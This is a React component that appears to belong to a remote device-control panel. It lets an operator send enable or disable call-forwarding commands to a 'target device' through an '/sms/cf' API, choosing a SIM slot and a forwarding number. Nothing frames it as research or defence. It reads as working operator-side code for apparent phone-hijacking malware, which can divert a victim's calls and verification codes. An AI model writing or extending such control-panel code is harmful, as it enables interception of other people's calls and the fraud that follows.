import React, { useMemo, useState } from 'react'
import { FiPhoneForwarded, FiPower } from 'react-icons/fi'
import { toast } from 'react-hot-toast'

import { API_BASE } from '../config'

function authHeaders(extra = {}) {
  return {
    Authorization: `Bearer ${localStorage.getItem('token') || ''}`,
    ...extra
  }
}

function simLabel(value, fallback) {
  const text = String(value || '').trim()
  if (!text || /^n\/?a$/i.test(text)) return `${fallback} — No SIM`
  if (/^unknown$/i.test(text)) return `${fallback} — Unknown`
  return `${fallback} — ${text}`
}

export default function CallForward({ deviceId, device }) {
  const [cfNumber, setCfNumber] = useState('')
  const [cfSimSlot, setCfSimSlot] = useState('0')
  const [cfBusy, setCfBusy] = useState(false)

  const simOptions = useMemo(() => ([
    { value: '0', label: simLabel(device?.phone_sim1, 'SIM 1') },
    { value: '1', label: simLabel(device?.phone_sim2, 'SIM 2') }
  ]), [device?.phone_sim1, device?.phone_sim2])

  async function callForward(action) {
    if (action === 'enable' && !cfNumber.trim()) {
      return toast.error('CALL FORWARD NUMBER REQUIRED')
    }

    setCfBusy(true)
    try {
      const response = await fetch(`${API_BASE}/sms/cf`, {
        method: 'POST',
        headers: authHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({
          deviceId,
          action,
          number: cfNumber.trim(),
          simSlot: Number(cfSimSlot)
        })
      })

      const payload = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(payload.error || 'Call forwarding failed')

      toast.success(action === 'enable' ? 'CALL FORWARD ENABLE SENT' : 'CALL FORWARD DISABLE SENT')
    } catch (error) {
      toast.error(`CALL FORWARD FAILED: ${error.message}`)
    } finally {
      setCfBusy(false)
    }
  }

  return (
    <section className="cyber-card p-4">
      <h2 className="mb-4 flex items-center gap-2 text-lg font-black tracking-wide text-emerald-300">
        <FiPhoneForwarded /> CALL FORWARDING
      </h2>

      <p className="mb-4 text-xs text-slate-400">
        Enable or disable call forwarding on the target device. Select the SIM card to apply the forwarding rule.
      </p>

      <div className="mb-5 rounded-xl border border-emerald-500/20 bg-black/30 p-3">
        <div className="mb-3 text-xs font-bold uppercase tracking-wider text-slate-400">Select SIM</div>
        <div className="grid gap-2 md:grid-cols-2">
          {simOptions.map((option) => (
            <label
              key={option.value}
              className="flex cursor-pointer items-center gap-3 rounded-xl border border-emerald-500/20 bg-slate-950/70 p-3 text-sm text-slate-200 hover:bg-emerald-500/10"
            >
              <input
                type="radio"
                name="cfSimSlot"
                value={option.value}
                checked={cfSimSlot === option.value}
                onChange={(event) => setCfSimSlot(event.target.value)}
                className="h-4 w-4 accent-emerald-400"
              />
              <span>{option.label}</span>
            </label>
          ))}
        </div>
      </div>

      <label className="mb-4 block">
        <span className="mb-2 block text-xs font-bold uppercase tracking-wider text-slate-400">Forwarding Number</span>
        <input
          value={cfNumber}
          onChange={(event) => setCfNumber(event.target.value)}
          className="w-full rounded-xl border border-emerald-500/30 bg-black/40 p-3 text-sm text-slate-100 outline-none focus:border-emerald-400"
          placeholder="+91XXXXXXXXXX"
        />
      </label>

      <div className="flex flex-col gap-3 md:flex-row">
        <button
          type="button"
          disabled={cfBusy}
          onClick={() => callForward('enable')}
          className="flex w-full items-center justify-center gap-2 rounded-xl bg-emerald-400 px-5 py-3 text-sm font-black text-black hover:bg-emerald-300 disabled:opacity-60 md:flex-1"
        >
          <FiPower />
          {cfBusy ? 'PROCESSING…' : 'ENABLE CALL FORWARD'}
        </button>
        <button
          type="button"
          disabled={cfBusy}
          onClick={() => callForward('disable')}
          className="flex w-full items-center justify-center gap-2 rounded-xl border border-red-500/40 px-5 py-3 text-sm font-bold text-red-300 hover:bg-red-500/10 disabled:opacity-60 md:flex-1"
        >
          <FiPower />
          {cfBusy ? 'PROCESSING…' : 'DISABLE CALL FORWARD'}
        </button>
      </div>
    </section>
  )
}
